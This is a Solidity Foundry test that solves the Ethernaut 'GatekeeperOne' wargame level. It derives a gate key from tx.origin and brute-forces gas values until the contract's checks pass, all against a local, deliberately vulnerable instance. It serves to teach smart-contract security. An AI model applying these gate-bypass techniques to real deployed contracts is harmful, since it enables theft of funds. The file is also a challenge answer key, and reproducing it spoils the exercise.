// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {GatekeeperOneFactory} from "../src/13-GatekeeperOne/GatekeeperOneFactory.sol";
import {GatekeeperOne} from "../src/13-GatekeeperOne/GatekeeperOne.sol";
import {GatekeeperOneAttack} from "../src/13-GatekeeperOne/GatekeeperOneAttack.sol";

contract GatekeeperOneTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testGatekeeperOneHack() public {
        // SETUP
        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));
        vm.stopPrank();

        // ATTACK
        GatekeeperOneAttack gatekeeperOneAttack = new GatekeeperOneAttack(levelAddress);

        // Need at 8 byte key that matches the conditions for gate 3 - we start from the fixed value - uint16(uint160(tx.origin) - then work out what the key needs to be
        bytes4 halfKey = bytes4(bytes.concat(bytes2(uint16(0)), bytes2(uint16(uint160(tx.origin)))));
        // key = "0x0000ea720000ea72"
        bytes8 key = bytes8(bytes.concat(halfKey, halfKey));

        for (uint256 i = 0; i <= 8191; i++) {
            try ethernautGatekeeperOne.enter{gas: 73990 + i}(key) {
                emit log_named_uint("Pass - Gas", 73990 + i);
                break;
            } catch {
                emit log_named_uint("Fail - Gas", 73990 + i);
            }
        }

        // SUBMIT
        vm.startPrank(tx.origin);
        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)), "level not solved");
        vm.stopPrank();
    }
}
